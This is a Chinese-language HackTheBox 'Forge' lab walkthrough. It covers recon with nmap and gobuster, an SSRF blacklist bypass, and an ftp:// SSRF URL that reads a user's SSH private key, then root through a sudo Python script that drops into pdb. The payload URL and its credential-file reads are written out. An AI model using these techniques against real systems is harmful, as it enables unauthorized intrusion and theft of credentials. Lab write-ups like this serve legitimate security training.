---
title: HackTheBox-forge
typora-root-url: ..
date: 2021-12-28 17:58:14
tags: HTB
---

## 简介

hostname：Forge.htb

ip:10.10.11.111

Os:linux



## 信息收集

### nmap

```
nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.111
```

```
22/tcp open     ssh     (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
|_http-title: Did not follow redirect to http://forge.htb
```



### gobuster

```
gobuster dir -u http://forge.htb/ -t 90 -w directory-list-2.3-medium.txt -e 
```

```
http://forge.htb/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
http://forge.htb/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/] 
http://forge.htb/upload               (Status: 200) [Size: 929]   
```

浏览网站有一个 上传图片页面，未发现明显漏洞，尝试爆破虚拟主机

```
gobuster vhost -u http://forge.htb/ -w subdomains-top1million-110000.txt -t 100
```

爆破出一个 admin.forge.htb 域名，直接访问提示 

```
Only localhost is allowed!
```

尝试插入header *X-Forwarded-For* 看能否绕过,绕过失败



## 攻击阶段

#### SSRF

突然想起来，上传图片那里，提供传入url 访问，应该是存在 SSRF 漏洞，于是可以利用这个点，尝试访问 admin.forge.htb

![image-20211229103955674](/assets/image-20211229103955674.png)



直接访问，发现在黑名单，尝试进行绕过,简单大小写混写就能绕过。

![image-20211229104505614](/assets/image-20211229104505614.png)

访问响应包中的url，即可查看到响应。

通过ssrf 漏洞浏览网页，在 http://admin.forGe.Htb/announcements 页面发现了一个 ftp 账号密码

```
<li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
```

并且 提示支持通过url 参数上传文件 ，使用参数 `u` 

通过尝试，发现admin的url上传可以使用 ftp/ftps 协议，而外面只能使用 http协议，因此尝试使用 ftp协议读取目录文件

![image-20211229115805050](/assets/image-20211229115805050.png)

此处可以看到读取到了 user.txt 

![image-20211229115954445](/assets/image-20211229115954445.png)



## 权限提升

测试使用user 账号密码进行ssh登陆时，提示需要使用密钥进行登录。这里我们已经读取到user.txt ,说明当前在用户的家目录，尝试读取私钥。

```
url=http://admin.forGe.Htb/upload?u=ftp://user:heightofsecurity123!@localHost:21/.ssh/id_rsa&remote=1
```

![image-20211229133149814](/assets/image-20211229133149814.png)

然后将私钥替换，进行登录

```
ssh -i id_a user@10.10.11.111
```

![image-20211229133315264](/assets/image-20211229133315264.png)



执行 sudo -l 查看

![image-20211229135636548](/assets/image-20211229135636548.png)

发现一个可疑脚本，可用sudo 执行，审计该脚本

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

这几个命令可疑尝试能否利用环境变量进行替换，但此处 sudo 限制了可执行文件的 PATH 变量，无法使用环境变量提权。

### PDB调试

观察到脚本引入了一个 模块 pdb，该模块会在执行错误时，进入pdb模式，可执行任意 python代码

尝试执行此脚本，在输入非预期的词时如 ls，会进入 PDB调试模式

进入pdb模式后，即可执行任意命令，读取 root.txt

![image-20211229142832956](/assets/image-20211229142832956.png)

